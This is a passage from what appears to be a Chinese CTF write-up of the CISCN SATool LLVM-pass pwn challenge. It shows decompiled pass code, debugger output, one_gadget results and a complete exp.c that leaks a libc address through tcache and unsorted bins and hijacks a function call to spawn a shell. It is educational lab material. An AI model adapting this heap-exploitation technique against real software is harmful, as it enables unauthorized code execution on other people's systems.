opcode!&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;/usr/include/llvm/IR/InstrTypes.h&quot;</span>,</span><br><span class=\"line\">                (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;stru_400.st_value + <span class=\"number\">5</span>,</span><br><span class=\"line\">                v63);</span><br><span class=\"line\">LABEL_141:</span><br><span class=\"line\">              llvm::llvm_unreachable_internal(</span><br><span class=\"line\">                (llvm *)<span class=\"string\">&quot;Invalid opcode!&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;/usr/include/llvm/IR/InstrTypes.h&quot;</span>,</span><br><span class=\"line\">                (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;stru_400.st_value + <span class=\"number\">5</span>,</span><br><span class=\"line\">                v67);</span><br><span class=\"line\">LABEL_142:</span><br><span class=\"line\">              llvm::llvm_unreachable_internal(</span><br><span class=\"line\">                (llvm *)<span class=\"string\">&quot;Invalid opcode!&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;/usr/include/llvm/IR/InstrTypes.h&quot;</span>,</span><br><span class=\"line\">                (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;stru_400.st_value + <span class=\"number\">5</span>,</span><br><span class=\"line\">                v78);</span><br><span class=\"line\">LABEL_143:</span><br><span class=\"line\">              llvm::llvm_unreachable_internal(</span><br><span class=\"line\">                (llvm *)<span class=\"string\">&quot;Invalid opcode!&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;/usr/include/llvm/IR/InstrTypes.h&quot;</span>,</span><br><span class=\"line\">                (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;stru_400.st_value + <span class=\"number\">5</span>,</span><br><span class=\"line\">                (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)v20);</span><br><span class=\"line\">LABEL_144:</span><br><span class=\"line\">              llvm::llvm_unreachable_internal(</span><br><span class=\"line\">                (llvm *)<span class=\"string\">&quot;Invalid opcode!&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;/usr/include/llvm/IR/InstrTypes.h&quot;</span>,</span><br><span class=\"line\">                (<span class=\"type\">const</span> <span class=\"type\">char</span> *)&amp;stru_400.st_value + <span class=\"number\">5</span>,</span><br><span class=\"line\">                (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)v24);</span><br><span class=\"line\">LABEL_154:</span><br><span class=\"line\">              __assert_fail(</span><br><span class=\"line\">                <span class=\"string\">&quot;i &lt; getNumArgOperands() &amp;&amp; \\&quot;Out of bounds!\\&quot;&quot;</span>,</span><br><span class=\"line\">                <span class=\"string\">&quot;/usr/include/llvm/IR/InstrTypes.h&quot;</span>,</span><br><span class=\"line\">                <span class=\"number\">0x470</span>u,</span><br><span class=\"line\">                <span class=\"string\">&quot;llvm::Value *llvm::CallBase::getArgOperand(unsigned int) const&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            v18 = <span class=\"number\">-2LL</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          v19 = llvm::CallBase::getNumTotalBundleOperands((llvm::CallBase *)(v6 - <span class=\"number\">3</span>));</span><br><span class=\"line\">          v20 = (<span class=\"type\">char</span> *)&amp;v8[<span class=\"number\">-3</span> * (*((_DWORD *)v8 + <span class=\"number\">5</span>) &amp; <span class=\"number\">0xFFFFFFF</span>)];</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( <span class=\"number\">-1431655765</span> * (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)((<span class=\"type\">unsigned</span> __int64)((<span class=\"type\">char</span> *)&amp;v15[<span class=\"number\">3</span> * v18 + <span class=\"number\">-3</span> * v19] - v20) &gt;&gt; <span class=\"number\">3</span>) == <span class=\"number\">2</span> )</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">            v21 = *((_BYTE *)v8 + <span class=\"number\">16</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( v21 == <span class=\"number\">79</span> )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              v22 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> ( v21 != <span class=\"number\">29</span> )</span><br><span class=\"line\">                <span class=\"keyword\">goto</span> LABEL_143;</span><br><span class=\"line\">              v22 = <span class=\"number\">-2LL</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            v23 = (__int64)&amp;v15[<span class=\"number\">3</span> * v22</span><br><span class=\"line\">                              + <span class=\"number\">-3</span> * (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)llvm::CallBase::getNumTotalBundleOperands((llvm::CallBase *)(v6 - <span class=\"number\">3</span>))];</span><br><span class=\"line\">            v24 = &amp;v8[<span class=\"number\">-3</span> * (*((_DWORD *)v8 + <span class=\"number\">5</span>) &amp; <span class=\"number\">0xFFFFFFF</span>)];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( !(<span class=\"number\">-1431655765</span> * (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)((<span class=\"type\">unsigned</span> __int64)(v23 - (_QWORD)v24) &gt;&gt; <span class=\"number\">3</span>)) )</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> LABEL_154;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( (*((_DWORD *)v8 + <span class=\"number\">5</span>) &amp; <span class=\"number\">0xFFFFFFF</span>) == <span class=\"number\">0</span> )</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> LABEL_153;</span><br><span class=\"line\">            v25 = *v24;</span><br><span class=\"line\">            v26 = *((_BYTE *)v8 + <span class=\"number\">16</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( v26 == <span class=\"number\">79</span> )</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              v27 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> ( v26 != <span class=\"number\">29</span> )</span><br><span class=\"line\">                <span class=\"keyword\">goto</span> LABEL_144;</span><br><span class=\"line\">              v27 = <span class=\"number\">-2LL</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            v28 = (__int64)&amp;v15[<span class=\"number\">3</span> * v27</span><br><span class=\"line\">                              + <span class=\"number\">-3</span> * (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)llvm::CallBase::getNumTotalBundleOperands((llvm::CallBase *)(v6 - <span class=\"number\">3</span>))];</span><br><span class=\"line\">            v29 = &amp;v8[<span class=\"number\">-3</span> * (*((_DWORD *)v8 + <span class=\"number\">5</span>) &amp; <span class=\"number\">0xFFFFFFF</span>)];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( <span class=\"number\">-1431655765</span> * (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)((<span class=\"type\">unsigned</span> __int64)(v28 - (_QWORD)v29) &gt;&gt; <span class=\"number\">3</span>) &lt;= <span class=\"number\">1</span> )</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> LABEL_154;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( (*((_DWORD *)v8 + <span class=\"number\">5</span>) &amp; <span class=\"number\">0xFFFFFFF</span>u) &lt;= <span class=\"number\">1</span> )</span><br><span class=\"line\">              <span class=\"keyword\">goto</span> LABEL_153;</span><br><span class=\"line\">            v30 = v29[<span class=\"number\">3</span>];</span><br><span class=\"line\">   <span class=\"comment\">// *************************************    / /         </span></span><br><span class=\"line\">            sub_2430(&amp;src, v25);</span><br><span class=\"line\">            sub_2430(v84, v30);</span><br><span class=\"line\">            bytes = n;</span><br><span class=\"line\">            chunk = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x18</span>uLL);            <span class=\"comment\">// 申请0x20的chunk</span></span><br><span class=\"line\">            chunk[<span class=\"number\">2</span>] = heap; </span><br></pre></td></tr></table></figure>\n<p>我们看这部分代码，一开始函数名就很长，但是我们看到了 compare，以及上文出现了 v10 = (_BYTE *) llvm::Value::getName (0LL);<br>\nv89 = dest; 这条，我们就大胆猜测，这里是判断函数名是否是 “save”。如果是，下面一大串就是对函数的一些常规检查，参数传递是否正确。</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220611234626847.png\" alt=\"image-20220611234626847\"></p>\n<p>像这里就是检查参数是否是有两个，不然就无法执行。下面一直到分割线之前都是我们不需要搭理的，甚至下面的两个函数我们也不需要搭理。我们只要知道下面那些可以直接看懂的部分就好了。后面的分析大致一样。</p>\n<h3 id=\"save\"><a class=\"markdownIt-Anchor\" href=\"#save\">#</a> save</h3>\n<p>我们看 save 部分的关键代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">       sub_2430(&amp;src, v25);</span><br><span class=\"line\">       sub_2430(v84, v30);</span><br><span class=\"line\">       bytes = n;</span><br><span class=\"line\">bytes = n;</span><br><span class=\"line\">       chunk = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x18</span>uLL);            <span class=\"comment\">// 申请0x20的chunk</span></span><br><span class=\"line\">       chunk[<span class=\"number\">2</span>] = heap_ptr;                    <span class=\"comment\">// +0x18</span></span><br><span class=\"line\">       heap_ptr = chunk;                       <span class=\"comment\">// 明显这里储存了chunk的地址</span></span><br><span class=\"line\">       v33 = (<span class=\"type\">char</span> *)src;</span><br><span class=\"line\">       <span class=\"built_in\">memcpy</span>(chunk, src, bytes);          <span class=\"comment\">// 向chunk中拷贝数据</span></span><br><span class=\"line\">       v34 = chunk_ptr + <span class=\"number\">1</span>;</span><br><span class=\"line\">       v35 = (<span class=\"type\">char</span> *)v84[<span class=\"number\">0</span>];</span><br><span class=\"line\">       <span class=\"built_in\">memcpy</span>(v34, v84[<span class=\"number\">0</span>], (<span class=\"type\">size_t</span>)v84[<span class=\"number\">1</span>]);</span><br></pre></td></tr></table></figure>\n<p>首先申请到一个 0x20 大小的 chunk，并将这个地址记录到全局变量 heap。就是说这个 heap 变量每次经过 save 就会被更新，旧的并没有被保存。chunk+0x18 的内存记录 heap 变量的地址。下面是有个 src，以及两个 memcpy，但是我们还不清楚 src 以及 v84 是什么。简单进入 sub_2430 函数看一眼，知道这起码是两个字符串，而且是我们传进来的参数。<em>“isString() &amp;&amp; “Not a string””,</em>, “isa<X>(Val) &amp;&amp; “cast_or_null<Ty>() argument of incompatible type!””, 涉及到对字符串的看呗我们还需要进行调试。拷贝分 2 次，我们一会调试看看。</p>\n<p>经过调试，src 就是我们 save () 的第一个参数，v84 是第二个参数。 而且我们发现我们申请到的空间离 heap 页开始的地址非常远。第一个参数会写在用户区最开始的地方，第二个参数在 chunk_use+0x8，所以我们猜测应该会有检查参数长度。但是我们不需要管。而且调试的时候还发现，我们在 chunk+0x18 的地方会写入 heap_ptr 保存的值。其实就是上一个 save 创建的 chunk。这样就形成了单链表。</p>\n<p>我们继续看剩下的几个操作，</p>\n<h3 id=\"takeaway\"><a class=\"markdownIt-Anchor\" href=\"#takeaway\">#</a> takeaway</h3>\n<p>相似的检查方式，只不过参数变为了一个。这里话有个重要的变量 n。但是目前不清楚数值。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">           &#123;</span><br><span class=\"line\">             heap_ptr = (_QWORD *)heap_ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">           <span class=\"built_in\">free</span>(v45);</span><br></pre></td></tr></table></figure>\n<p>猜测其实就是删除某个 chunk，并且将全局变量 heap_ptr 回复为上一个 chunk。但是具体是否有查询功能还不确定。</p>\n<h3 id=\"stealkey\"><a class=\"markdownIt-Anchor\" href=\"#stealkey\">#</a> stealkey</h3>\n<p>这部分代码很少，也没有检查函数的参数，所以这个函数应该是没有参数的。关键点在于 byte_204100 = *heap; 某个全局变量值变为 chunk 的字符串的值对应的内存值。。</p>\n<h3 id=\"fakekey\"><a class=\"markdownIt-Anchor\" href=\"#fakekey\">#</a> fakekey</h3>\n<p>要求函数有一个参数。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v76 = byte_204100;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> ( *(_BYTE *)(*v75 + <span class=\"number\">16LL</span>) == <span class=\"number\">13</span> )</span><br><span class=\"line\">                SExtValue = llvm::APInt::getSExtValue((llvm::APInt *)(*v75 + <span class=\"number\">24LL</span>));</span><br><span class=\"line\">              <span class=\"keyword\">else</span></span><br><span class=\"line\">                SExtValue = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">              byte_204100 = v76 + SExtValue;</span><br><span class=\"line\">              *heap = v76 + SExtValue;</span><br></pre></td></tr></table></figure>\n<p>v76 可以通过刚刚的 steal 来设置，就会变为我们可控的值。关键在与 sextvalue 是什么，我们调试看看</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220612014631136.png\" alt=\"image-20220612014631136\"></p>\n<p>调试后发现就是我们传进去的参数，如果我们要传负数，那就写补码。</p>\n<h3 id=\"run\"><a class=\"markdownIt-Anchor\" href=\"#run\">#</a> run</h3>\n<p>run 函数是最关键的也是最离谱的，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">((<span class=\"type\">void</span> (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))*heap)</span><br></pre></td></tr></table></figure>\n<p>直接无脑调用 heap_ptr 指向的 chunk 的 fd，那么思路就是想办法把地址写进去。这里就存在两个关键地方，一个是 fakekey 可以实现对 chunk 的 fd 的修改，在 v76 的基础上加上一个偏移量，那么如果我们能将 v76 的值改为 libc 或者 libc 的一个相关的值，加上一个 offset，就可以实现任意函数调用。因为 call  *heap 后面指定了参数为 0，我们就使用 onegadget。我们先看看这里的栈布局。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class=\"line\">*RAX  <span class=\"number\">0x7ffff33412fc</span> (exec_comm+<span class=\"number\">2508</span>) ◂— mov    rax, qword ptr [rip + <span class=\"number\">0x2e0ba5</span>]</span><br><span class=\"line\">*RBX  <span class=\"number\">0x0</span></span><br><span class=\"line\">*RCX  <span class=\"number\">0x0</span></span><br><span class=\"line\">*RDX  <span class=\"number\">0x0</span></span><br><span class=\"line\">*RDI  <span class=\"number\">0x0</span></span><br><span class=\"line\">*RSI  <span class=\"number\">0x0</span></span><br><span class=\"line\">*R8   <span class=\"number\">0x0</span></span><br><span class=\"line\">*R9   <span class=\"number\">0x0</span></span><br><span class=\"line\">*R10  <span class=\"number\">0x7c7738</span> —▸ <span class=\"number\">0x822940</span> —▸ <span class=\"number\">0x7fffffffdcf8</span> —▸ <span class=\"number\">0x7e4b50</span> —▸ <span class=\"number\">0x7e4b70</span> ◂— ...</span><br><span class=\"line\">*R11  <span class=\"number\">0x7ffff33f3b20</span> ◂— pop    rdi</span><br><span class=\"line\">*R12  <span class=\"number\">0x826e10</span> —▸ <span class=\"number\">0x7c7738</span> —▸ <span class=\"number\">0x822940</span> —▸ <span class=\"number\">0x7fffffffdcf8</span> —▸ <span class=\"number\">0x7e4b50</span> ◂— ...</span><br><span class=\"line\"> R13  <span class=\"number\">0x7fffffffda20</span> —▸ <span class=\"number\">0x7fffffffda30</span> ◂— <span class=\"number\">0x79656b006e7572</span> <span class=\"comment\">/* &#x27;run&#x27; */</span></span><br><span class=\"line\">*R14  <span class=\"number\">0x826e40</span> —▸ <span class=\"number\">0x826d88</span> —▸ <span class=\"number\">0x826c80</span> —▸ <span class=\"number\">0x826b80</span> —▸ <span class=\"number\">0x826990</span> ◂— ...</span><br><span class=\"line\">*R15  <span class=\"number\">0x826e28</span> —▸ <span class=\"number\">0x7e5218</span> —▸ <span class=\"number\">0x7fffffffdcf8</span> —▸ <span class=\"number\">0x7e4b50</span> —▸ <span class=\"number\">0x7e4b70</span> ◂— ...</span><br><span class=\"line\">*RBP  <span class=\"number\">0x8249c0</span> —▸ <span class=\"number\">0x6e7572</span> (isl_basic_set_compute_vertices+<span class=\"number\">2114</span>) ◂— js     <span class=\"number\">0x6e757c</span></span><br><span class=\"line\">*RSP  <span class=\"number\">0x7fffffffd950</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\">*RIP  <span class=\"number\">0x7ffff23a21ec</span> ◂— call   rax</span><br><span class=\"line\">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class=\"line\"> ► <span class=\"number\">0x7ffff23a21ec</span>    call   rax                           &lt;exec_comm+<span class=\"number\">2508</span>&gt;</span><br><span class=\"line\">        rdi: <span class=\"number\">0x0</span></span><br><span class=\"line\">        rsi: <span class=\"number\">0x0</span></span><br><span class=\"line\">        rdx: <span class=\"number\">0x0</span></span><br><span class=\"line\">        rcx: <span class=\"number\">0x0</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>先看看有没有合适的寄存器的 one_gadget, 没有的话在选择 stack 布局。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@ubuntu:~/Desktop/llvm/SATool_2021_ciscn$ one_gadget /lib/x86_64-linux-gnu/libc-2.27.so -l3</span><br><span class=\"line\">0x4f2a5 execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  rsp &amp; 0xf == 0</span><br><span class=\"line\">  rcx == NULL</span><br><span class=\"line\"></span><br><span class=\"line\">0x4f302 execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+0x40] == NULL</span><br><span class=\"line\"></span><br><span class=\"line\">0xe534f execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, r13, rbx)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [r13] == NULL || r13 == NULL</span><br><span class=\"line\">  [rbx] == NULL || rbx == NULL</span><br><span class=\"line\"></span><br><span class=\"line\">0xe54f7 execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, [rbp-0x88], [rbp-0x70])</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL</span><br><span class=\"line\">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class=\"line\"></span><br><span class=\"line\">0xe54fe execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rcx, [rbp-0x70])</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rcx] == NULL || rcx == NULL</span><br><span class=\"line\">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class=\"line\"></span><br><span class=\"line\">0xe5502 execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rcx, rdx)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rcx] == NULL || rcx == NULL</span><br><span class=\"line\">  [rdx] == NULL || rdx == NULL</span><br><span class=\"line\"></span><br><span class=\"line\">0x10a2fc execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+0x70] == NULL</span><br><span class=\"line\"></span><br><span class=\"line\">0x10a308 execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsi, [rax])</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsi] == NULL || rsi == NULL</span><br><span class=\"line\">  [[rax]] == NULL || [rax] == NULL</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>好多可以用的。</p>\n<p>问题来了我们怎么泄露 libc? 或者能否直接得到一个与 libc 相关的值？</p>\n<p>其实在第一次调试的时候吗，我们注意到第一次申请 0x20chunk 的时候，bins 不是空的，有 0x20 的 smallbin，largebin，u 你 sorted 斌，以及 tcache 中也有 7 个 bin。所以我们 save7 次将 tcache 取完，下一次就可以从 unsortedbin 中拿到，并且 fd 指向的是 main_arena+96, 与 libc 相关。我们只需要计算一下 offset 就可以了。</p>\n<p>我们申请第 8 个 chunk 的时候就选择空输入（’\\x00’），就不会变动 fd。</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220612021912812.png\" alt=\"image-20220612021912812\"></p>\n<p>这里可选择的 one_gadget 就很多了。选择了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x10a2fc</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x70</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x70</span>] == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>完整的 exp.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">run</span><span class=\"params\">()</span>&#123;<span class=\"keyword\">return</span> <span class=\"number\">0</span>;&#125;;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">save</span><span class=\"params\">(<span class=\"type\">char</span> *a1,<span class=\"type\">char</span> *a2)</span>&#123;<span class=\"keyword\">return</span> <span class=\"number\">0</span>;&#125;;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">fakekey</span><span class=\"params\">(int64)</span>&#123;<span class=\"keyword\">return</span> <span class=\"number\">0</span>;&#125;;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">takeaway</span><span class=\"params\">(<span class=\"type\">char</span> *a1)</span>&#123;<span class=\"keyword\">return</span> <span class=\"number\">0</span>;&#125;;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">B4ckDo0r</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        save(<span class=\"string\">&quot;aaaa&quot;</span>,<span class=\"string\">&quot;bbbb&quot;</span>);</span><br><span class=\"line\">        save(<span class=\"string\">&quot;aaddd&quot;</span>,<span class=\"string\">&quot;aadd&quot;</span>);</span><br><span class=\"line\">        save(<span class=\"string\">&quot;ssss&quot;</span>,<span class=\"string\">&quot;sss&quot;</span>);</span><br><span class=\"line\">        save(<span class=\"string\">&quot;ssss&quot;</span>,<span class=\"string\">&quot;sssss&quot;</span>);</span><br><span class=\"line\">        save(<span class=\"string\">&quot;sssss&quot;</span>,<span class=\"string\">&quot;sssss&quot;</span>);</span><br><span class=\"line\">        save(<span class=\"string\">&quot;sssss&quot;</span>,<span class=\"string\">&quot;sssss&quot;</span>);</span><br><span class=\"line\">\tsave(<span class=\"string\">&quot;sssss&quot;</span>,<span class=\"string\">&quot;sssss&quot;</span>);</span><br><span class=\"line\">        save(<span class=\"string\">&quot;\\x00&quot;</span>,<span class=\"string\">&quot;ssssss&quot;</span>);</span><br><span class=\"line\">        stealkey();</span><br><span class=\"line\">        fakekey(<span class=\"number\">-0x2E19b4</span>);</span><br><span class=\"line\">        run();</span><br><span class=\"line\"> </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>补充点，runOnFunction 会检查我们 exp 的入口是不是 B4ckDo0r，因为我们习惯 C 语言的代码为 main 为程序的入口。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dest[<span class=\"number\">2</span>] = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  name = (_QWORD *)llvm::Value::getName(a2);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v3 == <span class=\"number\">8</span> &amp;&amp; *name == <span class=\"string\">&#x27;r0oDkc4B&#x27;</span> )</span><br><span class=\"line\">  &#123;</span><br></pre></td></tr></table></figure>\n<h2 id=\"ciscn-2022-satool\"><a class=\"markdownIt-Anchor\" href=\"#ciscn-2022-satool\">#</a> ciscn 2022 satool</h2>\n<p>这里我依旧是跟着师傅们的文章一边复现一边记录学习。</p>\n<p>首先还是看 readme，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## Introduction</span><br><span class=\"line\">A LLVM Pass that can optimize add/sub instructions.</span><br><span class=\"line\">## How to run</span><br><span class=\"line\">opt-12 -load ./mbaPass.so -mba &#123;*.bc/*.ll&#125; -S</span><br><span class=\"line\">## Example</span><br><span class=\"line\">### IR before optimization</span><br><span class=\"line\">```</span><br><span class=\"line\">define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;</span><br><span class=\"line\">  %2 = sub nsw i64 %0, 2</span><br><span class=\"line\">  %3 = add nsw i64 %2, 68</span><br><span 